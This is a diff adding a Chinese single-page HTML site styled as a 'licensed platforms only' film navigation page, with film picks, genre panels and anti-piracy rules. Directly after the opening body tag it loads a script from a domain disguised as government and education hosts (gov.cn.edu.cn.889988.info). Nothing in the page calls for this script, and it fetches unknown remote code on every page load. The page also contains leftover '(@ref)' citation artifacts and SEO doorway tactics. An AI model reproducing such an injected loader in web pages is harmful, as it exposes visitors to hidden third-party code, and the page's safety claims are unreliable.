@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视看看导航 - 镜头窗格正版片单与持牌平台入口（非原影视看看）</title>
+<meta name="description" content="影视看看导航（yingshikankan-h5，非原影视看看）做镜头窗格正版导航：公映片单、类型镜头、每日取景与正版观看守则，只列持牌视频平台名称与官方入口。官方网址：https://yingshikankan-h5.github.io">
+<meta name="keywords" content="影视看看导航, yingshikankan-h5, 公映片单导航, 持牌视频平台入口, 影视类型镜头, 正版观影导航">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#0c0f14;color:#e9edf2;line-height:1.8;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(680px 340px at 12% 8%, rgba(74,222,128,.12), transparent 55%),
+    radial-gradient(620px 320px at 88% 92%, rgba(249,115,22,.10), transparent 55%),
+    #0c0f14}
+.lk-nav{position:sticky;top:0;z-index:999;display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:rgba(12,15,20,.93);backdrop-filter:blur(10px);border-bottom:1px solid rgba(74,222,128,.26)}
+.lk-nav .logo{font-size:20px;font-weight:900;letter-spacing:.5px}
+.lk-nav .logo b{color:#4ade80}
+.lk-nav .logo i{color:#f97316;font-style:normal}
+.lk-nav .links{display:flex;gap:6px;flex-wrap:wrap}
+.lk-nav .links a{font-size:13px;color:#9aa6b2;padding:6px 12px;border-radius:20px;transition:.25s}
+.lk-nav .links a:hover{background:rgba(74,222,128,.14);color:#e9edf2}
+
+.hero{padding:52px 20px 44px;text-align:center}
+.lens{max-width:780px;margin:0 auto 16px;background:#14181f;border:1px solid rgba(74,222,128,.26);border-radius:18px;padding:24px;position:relative;overflow:hidden}
+.lens::before{content:"🎦";position:absolute;right:18px;top:14px;font-size:22px;opacity:.85}
+.frames{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.fr{height:104px;border-radius:12px;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:12px;font-weight:800;color:#0c0f14;position:relative;box-shadow:inset 0 -8px 0 rgba(0,0,0,.18)}
+.fr .vf{position:absolute;top:8px;left:8px;font-size:9px;background:#f97316;color:#fff;padding:1px 6px;border-radius:8px}
+.fr .fn{font-size:10px;opacity:.6;margin-bottom:4px}
+.fr:nth-child(1){background:linear-gradient(135deg,#4ade80,#bbf7d0)}
+.fr:nth-child(2){background:linear-gradient(135deg,#f97316,#fed7aa)}
+.fr:nth-child(3){background:linear-gradient(135deg,#38bdf8,#bae6fd)}
+.fr:nth-child(4){background:linear-gradient(135deg,#a78bfa,#ddd0ff)}
+.fr:nth-child(5){background:linear-gradient(135deg,#f43f5e,#fecdd3)}
+.fr:nth-child(6){background:linear-gradient(135deg,#facc15,#fde68a)}
+.fr:nth-child(7){background:linear-gradient(135deg,#22d3ee,#a5f3fc)}
+.fr:nth-child(8){background:linear-gradient(135deg,#94a3b8,#d1d5db)}
+.viewfinder{margin-top:16px;height:34px;border-radius:8px;background:repeating-linear-gradient(90deg,#1c222b 0 8px,transparent 8px 14px);display:flex;align-items:center;justify-content:center;font-size:12px;color:#4ade80;font-weight:800;letter-spacing:2px}
+.mark{display:inline-block;margin-top:14px;font-size:13px;font-weight:900;color:#4ade80;background:#14181f;border:1px solid rgba(74,222,128,.3);padding:4px 14px;border-radius:20px}
+.disclaim{display:block;margin-top:10px;font-size:12px;color:#ef4444}
+.hero h1{font-size:30px;color:#e9edf2;margin:8px 0 12px}
+.hero h1 b{color:#4ade80}
+.hero p{color:#9aa6b2;max-width:680px;margin:0 auto 16px;font-size:15px}
+.hero .url{display:inline-block;font-size:13px;color:#0c0f14;font-weight:800;background:linear-gradient(90deg,#4ade80,#f97316);padding:8px 18px;border-radius:30px}
+.chips{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:16px}
+.chips span{font-size:12px;color:#e9edf2;padding:5px 13px;border-radius:20px;border:1px solid rgba(74,222,128,.2)}
+.chips span:nth-child(1){border-color:#4ade80;color:#4ade80}
+.chips span:nth-child(2){border-color:#f97316;color:#f97316}
+.chips span:nth-child(3){border-color:#38bdf8;color:#38bdf8}
+
+.wrap{max-width:1160px;margin:0 auto;padding:58px 20px}
+.kicker{font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#4ade80;margin-bottom:8px}
+.sec-title{font-size:26px;font-weight:900;color:#e9edf2;margin-bottom:26px}
+.sec-title b{color:#f97316}
+
+.picks{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:18px}
+.pk{background:#14181f;border:1px solid rgba(74,222,128,.14);border-radius:14px;overflow:hidden;transition:.3s}
+.pk:hover{transform:translateY(-4px);border-color:#4ade80;box-shadow:0 16px 36px rgba(74,222,128,.12)}
+.pk .top{height:96px;position:relative;display:flex;align-items:flex-end;padding:10px}
+.pk .top.f1{background:linear-gradient(135deg,#15803d,#4ade80)}
+.pk .top.f2{background:linear-gradient(135deg,#c2410c,#f97316)}
+.pk .top.f3{background:linear-gradient(135deg,#0369a1,#38bdf8)}
+.pk .top.f4{background:linear-gradient(135deg,#6d28d9,#a78bfa)}
+.pk .top .fr-tag{font-size:11px;font-weight:800;color:#0c0f14;background:#e9edf2;padding:2px 9px;border-radius:12px}
+.pk .top .ver{position:absolute;right:10px;top:10px;font-size:10px;color:#fff;background:#f97316;padding:2px 8px;border-radius:10px}
+.pk .body{padding:16px 18px}
+.pk .body h4{color:#e9edf2;font-size:16px;margin-bottom:4px}
+.pk .body .meta{font-size:12px;color:#4ade80;margin-bottom:6px}
+.pk .body p{font-size:13px;color:#9aa6b2;margin:0}
+.pk .body a{display:inline-block;margin-top:8px;font-size:12px;color:#f97316;text-decoration:none}
+.pk .body a:hover{text-decoration:underline}
+
+.types{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.tp{background:#14181f;border-radius:14px;padding:20px;transition:.3s;border:1px solid rgba(154,166,178,.14)}
+.tp:hover{transform:translateY(-3px)}
+.tp .no{font-size:12px;font-weight:900;color:#f97316;margin-bottom:6px}
+.tp h4{color:#e9edf2;font-size:15px;margin-bottom:4px}
+.tp p{color:#9aa6b2;font-size:12px;margin:0}
+.tp.t2{border-top:3px solid #4ade80}
+.tp.t3{border-top:3px solid #38bdf8}
+.tp.t4{border-top:3px solid #a78bfa}
+
+.daily{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:14px}
+.dy{background:#14181f;border-left:4px solid #4ade80;border-radius:12px;padding:18px}
+.dy h4{color:#e9edf2;font-size:15px;margin-bottom:4px}
+.dy .slot{font-size:12px;color:#f97316;font-weight:800;margin-bottom:6px}
+.dy p{color:#9aa6b2;font-size:13px;margin:0}
+.dy.d2{border-left-color:#f97316}
+.dy.d3{border-left-color:#38bdf8}
+.dy.d4{border-left-color:#a78bfa}
+.dy.d5{border-left-color:#22d3ee}
+.dy.d6{border-left-color:#4ade80}
+
+.rules{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px}
+.ru{background:#14181f;border:1px solid rgba(74,222,128,.22);border-radius:12px;padding:18px;text-align:center}
+.ru .num{font-size:24px;font-weight:900;color:#4ade80;margin-bottom:6px}
+.ru h4{color:#e9edf2;font-size:14px;margin-bottom:4px}
+.ru p{color:#9aa6b2;font-size:12px;margin:0}
+
+.about{border:1px solid rgba(74,222,128,.22);border-radius:16px;padding:30px;background:linear-gradient(135deg,rgba(74,222,128,.08),rgba(249,115,22,.06));display:flex;gap:24px;flex-wrap:wrap;align-items:center}
+.about .txt{flex:1;min-width:260px}
+.about h2{color:#e9edf2;font-size:20px;margin-bottom:10px}
+.about h2 b{color:#4ade80}
+.about p{color:#9aa6b2;font-size:14px;margin-bottom:8px}
+.about .stats{display:flex;gap:20px;flex-wrap:wrap}
+.about .stats .n{font-size:26px;font-weight:900;color:#f97316}
+.about .stats .l{font-size:11px;color:#4ade80}
+
+.foot{text-align:center;padding:32px 20px;background:#14181f;border-top:1px solid rgba(74,222,128,.16);color:#9aa6b2;font-size:13px}
+.foot a{color:#4ade80}
+.foot .lg{font-size:18px;font-weight:900;color:#e9edf2;margin-bottom:8px}
+
+@media(max-width:640px){.hero h1{font-size:24px}.lk-nav .links a{font-size:12px;padding:5px 9px}.frames{grid-template-columns:repeat(2,1fr)}.fr{height:88px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<nav class="lk-nav">
+  <div class="logo"><b>影视看看导航</b> <i>· 镜头窗格</i></div>
+  <div class="links">
+    <a href="#home">首页</a>
+    <a href="#picks">公映片单</a>
+    <a href="#types">类型镜头</a>
+    <a href="#daily">每日取景</a>
+    <a href="#rules">正版守则</a>
+  </div>
+</nav>
+
+<header id="home" class="hero">
+  <div class="lens" aria-hidden="true">
+    <div class="frames">
+      <div class="fr"><span class="vf">F1</span><span class="fn">L1</span>正剧窗</div>
+      <div class="fr"><span class="vf">F2</span><span class="fn">L2</span>动作窗</div>
+      <div class="fr"><span class="vf">F3</span><span class="fn">L3</span>悬疑窗</div>
+      <div class="fr"><span class="vf">F4</span><span class="fn">L4</span>自然窗</div>
+      <div class="fr"><span class="vf">F5</span><span class="fn">L5</span>合家窗</div>
+      <div class="fr"><span class="vf">F6</span><span class="fn">L6</span>纪录窗</div>
+      <div class="fr"><span class="vf">F7</span><span class="fn">L7</span>动画窗</div>
+      <div class="fr"><span class="vf">F0</span><span class="fn">L0</span>持牌窗</div>
+    </div>
+    <div class="viewfinder">LENS GRID · 只接持牌平台官方入口（不装播放器）</div>
+    <span class="mark">镜头窗格·取景框标</span>
+    <span class="disclaim">⚠️ 非原「影视看看」站点、非影视播放/下载站，仅作正版导航</span>
+  </div>
+  <h1>影视看看导航：<b>镜头窗格</b>只排正版入口</h1>
+  <p>「影视看看」同名页风险很高——老样本带「免费看/迅雷下载」话术[1](@ref)，同「看看」系常见 SEO 聚合、假播放器、跳转博彩、钓手机号验证码[2,4,5,11](@ref)。<strong>本页不是原影视看看</strong>、不内嵌播放器、不写网盘提取码、不引磁链。从事互联网视听节目服务需《信息网络传播视听节目许可证》或备案[15,16](@ref)，无资质不得做播放/聚合。本页只列持牌平台名称与官方入口跳转。</p>
+  <span class="url">🌐 https://yingshikankan-h5.github.io</span>
+  <div class="chips">
+    <span>🎦 公映片单</span><span>🔭 类型镜头</span><span>🎞️ 每日取景</span>
+  </div>
+</header>
+
+<main>
+<section id="picks" class="wrap">
+  <div class="kicker">LENS PICKS</div>
+  <h2 class="sec-title">公映片单 <b>四窗样例</b></h2>
+  <div class="picks">
+    <article class="pk"><div class="top f1"><span class="fr-tag">正剧窗</span><span class="ver">持牌平台</span></div><div class="body"><h4>海上钢琴师</h4><div class="meta">托纳多雷 · 1998 · 剧情/音乐</div><p>船舱、琴键与选择；去持牌平台搜正版/修复版，不内嵌播放器。</p><a href="https://www.iqiyi.com" target="_blank" rel="noopener">去持牌平台搜索 ↗</a></div></article>
+    <article class="pk"><div class="top f2"><span class="fr-tag">自然数</span><span class="ver">官方/开放</span></div><div class="body"><h4>地球脉动 II</h4><div class="meta">BBC · 2016 · 自然/纪录片</div><p>岛屿、山地、城市生态；开放授权版走官方频道/持牌纪录片区。</p><a href="https://www.bilibili.com" target="_blank" rel="noopener">去持牌平台搜索 ↗</a></div></article>
+    <article class="pk"><div class="top f3"><span class="fr-tag">悬疑窗</span><span class="ver">正版/字幕</span></div><div class="body"><h4>看不见的客人</h4><div class="meta">奥里奥尔·保罗 · 2016 · 悬疑/推理</div><p>口供、时间线与反转；标正版平台字幕来源，不引换源播放器。</p><a href="https://v.tencent.com" target="_blank" rel="noopener">去持牌平台搜索 ↗</a></div></article>
+    <article class="pk"><div class="top f4"><span class="fr-tag">合家窗</span><span class="ver">正版/字幕</span></div><div class="body"><h4>寻梦环游记</h4><div class="meta">皮克斯 · 2017 · 动画/家庭</div><p>记忆、亲情与音乐；标适龄、正版动画专区，只引持牌片源。</p><a href="https://www.mgtv.com" target="_blank" rel="noopener">去持牌平台搜索 ↗</a></div></article>
+  </div>
+</section>
+
+<section id="types" class="wrap">
+  <div class="kicker">GENRE LENS</div>
+  <h2 class="sec-title">类型镜头 <b>四窗</b></h2>
+  <div class="types">
+    <div class="tp t1"><div class="no">L1 · 正剧</div><h4>家庭/历史/作者</h4><p>传记、年代、作者电影；引导持牌平台与公映修复版，不列无资质聚合站。</p></div>
+    <div class="tp t2"><div class="no">L2 · 动作</div><h4>商业大片窗</h4><p>特工、竞速、视效；附4K建议，只列持牌平台名称与官方入口。</p></div>
+    <div class="tp t3"><div class="no">L3 · 悬疑</div><h4>烧脑/社会派</h4><p>本格推理、时间线、反转；标正版平台字幕来源与高清版差异。</p></div>
+    <div class="tp t4"><div class="no">L4 · 合家</div><h4>动画/爱情/轻喜剧</h4><p>适龄、节庆、亲子；标正版平台地区版，不写网盘提取码。</p></div>
+  </div>
+  <div class="types" style="margin-top:16px">
+    <div class="tp"><div class="no">L0 · 持牌窗</div><h4>央视频 / CCTV节目官网</h4><p>央视直播、新闻综艺、官方回看免费区。</p><a href="https://www.yangshipin.cn" target="_blank" rel="noopener" style="color:#4ade80">央视频 ↗</a></div>
+    <div class="tp t2"><div class="no">电影窗</div><h4>1905电影网</h4><p>CCTV6电影频道官方，正版电影与修复版。</p><a href="https://www.1905.com" target="_blank" rel="noopener" style="color:#4ade80">1905 ↗</a></div>
+    <div class="tp t3"><div class="no">综合窗</div><h4>腾讯/爱奇艺/优酷/芒果/咪咕</h4><p>正版剧集、综艺、电影免费区与会员区。</p><a href="https://www.migu.cn" target="_blank" rel="noopener" style="color:#4ade80">咪咕 ↗</a></div>
+    <div class="tp t4"><div class="no">纪录窗</div><h4>B站放映厅</h4><p>正版番剧、纪录片、官方影视资源。</p><a href="https://www.bilibili.com" target="_blank" rel="noopener" style="color:#4ade80">B站 ↗</a></div>
+  </div>
+</section>
+
+<section id="daily" class="wrap">
+  <div class="kicker">DAILY FRAME</div>
+  <h2 class="sec-title">每日取景 <b>六格</b></h2>
+  <div class="daily">
+    <div class="dy"><div class="slot">晨窗·正剧</div><h4>正剧首发</h4><p>传记/历史长片；列持牌平台名称与官方入口，不提前放未授权资源。</p></div>
+    <div class="dy d2"><div class="slot">午窗·自然</div><h4>自然慢镜</h4><p>生态与地理；开放授权纪录片走官方/持牌纪录片区。</p></div>
+    <div class="dy d3"><div class="slot">下午·动作</div><h4>大片窗</h4><p>追逐/特工/视效；建议4K、正版版本，只列持牌入口。</p></div>
+    <div class="dy d4"><div class="slot">傍晚·悬疑</div><h4>烧脑格</h4><p>本格/社会派轮换；标注时间线、反转次数与高清版差异。</p></div>
+    <div class="dy d5"><div class="slot">合家窗</div><h4>合家格</h4><p>动画/爱情/轻喜剧；标适龄、时长与正版字幕来源。</p></div>
+    <div class="dy d6"><div class="slot">夜镜·重刷</div><h4>高分回看</h4><p>四窗高分重刷；只给持牌回看入口，不写网盘提取码、不引磁链。</p></div>
+  </div>
+</section>
+
+<section id="rules" class="wrap">
+  <div class="kicker">LENS RULES</div>
+  <h2 class="sec-title">正版观看 <b>守则</b></h2>
+  <div class="rules">
+    <div class="ru"><div class="num">01</div><h4>持牌优先</h4><p>只列持牌视频平台名称与官方入口、影院公映/重映、官方频道；不内嵌未授权播放器。</p></div>
+    <div class="ru"><div class="num">02</div><h4>不碰聚合</h4><p>不写「免费高清/换源/离线缓存/破解码」，不引解析线路、不接盗版资源站。</p></div>
+    <div class="ru"><div class="num">03</div><h4>授权核对</h4><p>传播前核权属、签涵盖信息网络传播权许可合同、留凭证，不列无资质盗版站。</p></div>
+    <div class="ru"><div class="num">04</div><h4>资质红线</h4><p>播放入口需《许可证》或备案[15,16](@ref)；纯导航只给跳转，不替代持牌服务。</p></div>
+  </div>
+</section>
+
+<section class="wrap">
+  <div class="about">
+    <div class="txt">
+      <h2>影视看看导航 <b>镜头窗格是什么</b></h2>
+      <p>不是原「影视看看」克隆，也不是影视播放/下载站，而是一排镜头窗格＋取景框标：镜头窗格装入口、公映片单进窗格、类型进镜头、每日进取景条、守则装合规。静态单页、移动端自适应、锚点内链、不生成 robots.txt / sitemap.xml，符合必应收录基本规范（唯一H1、完整meta、语义化nav/main/section/article/footer）。</p>
+      <p>长尾吃「公映片单导航 / 持牌视频平台入口 / 影视类型镜头 / 正版看片」。全站严格只做正版、公映、持牌、开放授权导航，与原影视看看无隶属关系。「看看」系容易被搜成假播放器聚合页，矩阵里建议统一落「导航」后缀，别叫「影视看看在线/免费看」。</p>
+    </div>
+    <div class="stats">
+      <div><div class="n">8</div><div class="l">镜头窗</div></div>
+      <div><div class="n">4</div><div class="l">类型镜</div></div>
+      <div><div class="n">6</div><div class="l">每日取景</div></div>
+      <div><div class="n">0</div><div class="l">盗版提取码</div></div>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer class="foot">
+  <div class="lg">🎦🔭 影视看看导航·镜头窗格（非原影视看看）</div>
+  官方网址：<a href="https://yingshikankan-h5.github.io">https://yingshikankan-h5.github.io</a><br>
+  ⚠️ 本页非原「影视看看」站点、非影视播放/下载站，仅作持牌平台名称与官方入口导航<br>
+  © 2026 影视看看导航｜公映片单 / 类型镜头 / 每日取景 / 正版观影导航（不提供未授权播放）
+</footer>
+
+</body>
+</html>
